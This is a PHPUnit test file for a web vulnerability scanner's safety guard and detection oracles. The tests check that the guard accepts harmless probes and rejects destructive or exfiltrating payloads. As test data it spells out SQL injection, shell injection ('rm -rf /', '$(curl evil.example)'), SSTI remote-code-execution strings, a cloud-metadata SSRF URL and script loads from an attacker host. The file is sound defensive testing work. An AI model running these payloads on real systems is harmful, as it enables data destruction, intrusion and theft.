<?php

namespace Tests\Unit;

use App\Security\Hunter;
use App\Security\PayloadOracles;
use PHPUnit\Framework\TestCase;

class HunterTest extends TestCase
{
    private function experiment(array $overrides = []): array
    {
        return ['method' => 'GET', 'path' => '/servicos/perfil', 'point' => 'query', 'key' => 'apelido',
            'technique' => 'xss', 'payload' => '" autofocus onfocus="{MARKER}', 'false_payload' => null, 'rationale' => 'contexto de atributo', ...$overrides];
    }

    private function guard(array $experiment): ?string
    {
        return Hunter::guard($experiment, fn (string $path) => str_starts_with($path, '/servicos/'));
    }

    public function test_guard_accepts_a_creative_payload_inside_the_scope(): void
    {
        $this->assertNull($this->guard($this->experiment()));
        $this->assertNull($this->guard($this->experiment(['technique' => 'ssti', 'payload' => '${{A}*{B}}'])));
        $this->assertNull($this->guard($this->experiment(['technique' => 'command', 'payload' => '127.0.0.1;echo $(({A}*{B}))'])));
        $this->assertNull($this->guard($this->experiment(['technique' => 'ssrf', 'payload' => '{CALLBACK}'])));
    }

    public function test_guard_blocks_destructive_sql_and_shell_commands(): void
    {
        foreach (["1'; DROP TABLE pedidos;-- -", "1' UNION SELECT 1 INTO OUTFILE '/tmp/x'-- -", '1; DELETE FROM users'] as $payload) {
            $this->assertNotNull($this->guard($this->experiment(['technique' => 'sqli_error', 'payload' => $payload])), $payload);
        }
        foreach (['127.0.0.1; rm -rf /', '$(curl evil.example)', '127.0.0.1 && wget x', '`shutdown -h now`'] as $payload) {
            $this->assertNotNull($this->guard($this->experiment(['technique' => 'command', 'payload' => $payload.' {A}{B}'])), $payload);
        }
    }

    public function test_guard_blocks_destructive_template_injection_in_ssti(): void
    {
        foreach ([
            "{{ {A}*{B} }}{{ cycler.__init__.__globals__.os.popen('rm -rf /dados').read() }}",
            '{{ {A}*{B} }}#{ T(java.lang.Runtime).getRuntime().exec("id") }',
            '${ {A}*{B} }${ subprocess.check_output }',
            '{{ {A}*{B} }}{{ config.__class__.__init__.__globals__ }}',
        ] as $payload) {
            $this->assertNotNull($this->guard($this->experiment(['technique' => 'ssti', 'payload' => $payload])), $payload);
        }
    }

    public function test_guard_blocks_contact_with_third_party_hosts(): void
    {
        $this->assertNotNull($this->guard($this->experiment(['technique' => 'ssrf', 'payload' => 'http://169.254.169.254/latest/meta-data'])));
        $this->assertNotNull($this->guard($this->experiment(['payload' => '"><script src=//evil.example/x.js></script>{MARKER}'])));
        // Contorno por ponto à frente do host e por contrabarra.
        $this->assertNotNull($this->guard($this->experiment(['payload' => '"><script src=//.evil.example/x.js></script>{MARKER}'])));
        $this->assertNotNull($this->guard($this->experiment(['payload' => '"><script src=\\\\evil.example\\x.js></script>{MARKER}'])));
    }

    public function test_guard_requires_the_placeholder_the_oracle_needs_to_prove_it(): void
    {
        $this->assertNotNull($this->guard($this->experiment(['payload' => '" onfocus="alert(1)'])));
        $this->assertNotNull($this->guard($this->experiment(['technique' => 'ssti', 'payload' => '{{7*7}}'])));
        $this->assertNotNull($this->guard($this->experiment(['technique' => 'sqli_bool', 'payload' => "1' AND '1'='1'-- -", 'false_payload' => null])));
    }

    public function test_guard_rejects_out_of_scope_paths_and_unknown_techniques(): void
    {
        $this->assertNotNull($this->guard($this->experiment(['path' => '/administracao/usuarios'])));
        $this->assertNotNull($this->guard($this->experiment(['technique' => 'ddos'])));
        $this->assertNotNull($this->guard($this->experiment(['point' => 'body', 'method' => 'GET'])));
    }

    public function test_resolve_turns_placeholders_into_provable_values(): void
    {
        $resolved = Hunter::resolve($this->experiment(['technique' => 'ssti', 'payload' => '{{{A}*{B}}}']));

        $this->assertMatchesRegularExpression('~^\{\{\d{4}\*\d{4}\}\}$~', $resolved['value']);
        preg_match('~(\d{4})\*(\d{4})~', $resolved['value'], $factors);
        $this->assertSame((string) ($factors[1] * $factors[2]), $resolved['expected']);

        $xss = Hunter::resolve($this->experiment());
        $this->assertStringContainsString($xss['marker'], $xss['value']);
        $this->assertStringNotContainsString('{MARKER}', $xss['value']);

        $redirect = Hunter::resolve($this->experiment(['technique' => 'open_redirect', 'payload' => '//{CANARY}']));
        $this->assertStringEndsWith('.invalid', $redirect['marker']);
        $this->assertSame('//'.$redirect['marker'], $redirect['value']);
    }

    public function test_evaluation_oracle_proves_ssti_and_command_execution(): void
    {
        $ssti = PayloadOracles::evaluationAssess('/mensagem', 'ssti', '64864529', '<p>Olá 64864529</p>', '<p>Olá egide</p>');
        $this->assertSame('falha', $ssti['verdict']);
        $this->assertSame('InjectionCheck · SSTI', $ssti['finding']['category']);
        $this->assertSame('critical', $ssti['finding']['severity']);

        $command = PayloadOracles::evaluationAssess('/diagnostico', 'command', '64864529', 'PING ok 64864529', 'PING ok');
        $this->assertSame('InjectionCheck · injeção de comando', $command['finding']['category']);

        $echoed = PayloadOracles::evaluationAssess('/mensagem', 'ssti', '64864529', 'Você digitou {{7919*8191}}', 'Você digitou egide');
        $this->assertSame('protegido', $echoed['verdict']);

        $already = PayloadOracles::evaluationAssess('/mensagem', 'ssti', '64864529', 'total 64864529', 'total 64864529');
        $this->assertNotSame('falha', $already['verdict']);
    }

    public function test_delay_oracle_labels_command_injection_by_time(): void
    {
        $delay = PayloadOracles::delayAssess('/diagnostico', 'command_time', 120.0, 5400.0, 200);

        $this->assertSame('falha', $delay['verdict']);
        $this->assertSame('InjectionCheck · injeção de comando', $delay['finding']['category']);
        $this->assertSame('protegido', PayloadOracles::delayAssess('/diagnostico', 'command_time', 120.0, 300.0, 200)['verdict']);
    }
}
